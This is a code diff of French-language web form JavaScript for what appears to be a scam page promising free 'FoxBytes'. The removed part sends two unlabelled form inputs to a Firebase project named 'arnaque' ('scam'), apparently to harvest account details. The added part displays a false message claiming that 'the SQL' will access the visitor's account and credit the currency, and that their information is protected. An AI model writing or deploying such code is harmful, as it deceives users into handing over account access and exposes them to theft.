@@ -1,1 +1,30 @@
-import { initializeApp } from "https://www.gstatic.com/firebasejs/13.2.0/firebase-app.js";import {    getFirestore,    collection,    addDoc,    serverTimestamp} from "https://www.gstatic.com/firebasejs/13.2.0/firebase-firestore.js";// Configuration Firebaseconst firebaseConfig = {    apiKey: "AIzaSyAs4lVL8flhdQ7BRwlUMzyPuA7LCE8yHas",    authDomain: "arnaque-be6ff.firebaseapp.com",    databaseURL: "https://arnaque-be6ff-default-rtdb.europe-west1.firebasedatabase.app",    projectId: "arnaque-be6ff",    storageBucket: "arnaque-be6ff.firebasestorage.app",    messagingSenderId: "1051032809697",    appId: "1:1051032809697:web:2b49b83eadbb1b787087a0",    measurementId: "G-LHS22QXWE0"};// Initialisationconst app = initializeApp(firebaseConfig);const db = getFirestore(app);// Formulaireconst formulaire = document.getElementById("formulaire");const bouton = document.getElementById("bouton");const message = document.getElementById("message");formulaire.addEventListener("submit", async (event) => {    event.preventDefault();    const entree1 = document.getElementById("entree1").value.trim();    const entree2 = document.getElementById("entree2").value.trim();    if (!entree1 || !entree2) {        message.textContent = "Veuillez remplir les deux champs.";        return;    }    bouton.disabled = true;    message.textContent = "Enregistrement en cours...";    try {        await addDoc(collection(db, "reponses"), {            entree1: entree1,            entree2: entree2,            date: serverTimestamp()        });        message.textContent = "Enregistrement r�ussi !";        formulaire.reset();    } catch (error) {        console.error("Erreur Firebase :", error);        message.textContent = "Une erreur est survenue lors de l'envoi.";    } finally {        bouton.disabled = false;    }});
+
+const formulaire = document.getElementById("formulaire");
+
+formulaire.addEventListener("submit", function(event) {
+
+    event.preventDefault();
+
+    const montant = document.getElementById("montant").value;
+
+    if (
+        montant === "" ||
+        !Number.isSafeInteger(Number(montant)) ||
+        Number(montant) <= 0
+    ) {
+        alert("Veuillez entrer un nombre entier valide de FoxBytes.");
+        return;
+    }
+
+    // AFFICHAGE DU MESSAGE PERSONNALISÉ
+
+    const ecran = document.getElementById("messagePleinEcran");
+    const texte = document.getElementById("texteMessage");
+
+    // REMPLACE LE # PAR TON MESSAGE
+    texte.textContent = "Merci pour nous avoir fait confiance. Si tout ce passe bien le temps que le SQL accède à ton compte et vous donne vos FoxBytes, vous obtiendrez dans la journée. Ne vous inquietez, vos informations son biensûr protéger par notre confidentialité. Merci et Au revoir!";
+
+    ecran.style.display = "flex";
+
+});
+
